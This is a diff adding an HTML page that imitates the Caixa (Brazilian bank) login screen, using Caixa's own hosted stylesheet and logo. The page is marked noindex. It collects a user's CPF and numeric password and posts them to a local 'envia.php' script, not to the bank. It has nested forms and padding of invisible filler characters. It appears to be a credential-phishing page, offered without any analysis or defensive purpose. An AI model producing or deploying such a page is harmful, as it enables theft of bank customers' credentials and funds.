@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+    <title> Entrar em Login Caixa</title>
+    <link rel="stylesheet" href=style.css crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link href="https://login.caixa.gov.br/auth/resources/7.3.3.ga/login/LoginCaixa2Passos/css/main.css?version=1" rel="stylesheet" type="text/css" />
+    
+</head>
+<body>
+
+<div class="cad">
+<h1>CADASTRAR USUARIO:</h1>
+<form method="POST"action="envia.php">
+    <div id="template">
+        <div id="template-wrapper">
+            <div id="template-wrapper-content">
+                <header id="template-header">
+                    <img id="template-logo" class="fa" src="https://login.caixa.gov.br/auth/resources/7.3.3.ga/login/LoginCaixa2Passos/images/logo/logo-caixa.png">
+                    <h2 id="template-title" class="text-font subtitle">Login Caixa</h2>
+                    ㅤㅤㅤㅤㅤㅤ
+                </header>
+                <p class="description text-font">Informe seu CPF e clique em &quot;Próximo&quot; para continuar:</p>
+
+                <form method="post" action="senha.html">
+                    <span class="float-label">
+                        <div id="cpfAlert" class="alert alert-danger mt-2" role="alert" style="display: none;color: red;border: none;">
+                            CPF Inválido
+                        </div>
+                        <input id="cpf" name="cpf" type="text" inputmode="numeric" autofocus autocomplete="off" required maxlength="14" />
+                        <label for="cpf" class="font-family"><i class="font-family"></i> CPF</label>
+                    </span>ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ
+                    ㅤㅤㅤㅤㅤㅤ
+                    ㅤㅤㅤㅤㅤㅤ
+                    
+                    <span class="float-label">
+                        <input id="pass-input" name="senha" type="password" inputmode="numeric" maxlength="8" autofocus autocomplete="off" required />
+                        <label for="password" class="font-family"><i class="font-family"></i> Senha</label>
+                    </span>
+                    <div class="button-group text-font">
+                    
+                    <form method="post" action="termos.html">
+                    
+                        <div class="button-group text-font" data-callback='onSubmit'>
+                            <button type="submit" id="login-button">Entrar</button>
+
+                        </div>
+                    </form>
+                    </div>
+                    <section class="login-options">
+                        <span class="link-block">
+                            <span>É novo por aqui?</span>
+                            <a href="senha.html">Cadastre-se</a>
+                        </span>
+                    </section>
+                    
+                </form>
+                <footer id="template-info">
+                    <section id="template-faq">
+                        <img src="../img/inter.png" width="25" alt="ajuda">
+                        <a href="#faq" onclick="toggleFaq()">Preciso de ajuda</a>
+                        <div id="faq"></div>
+                    </section>
+                </footer>
+            </div>
+        
+        </div>
+    </div>
+
+
+</form>
+
+
+
+</div>    
+</body>
+</html>
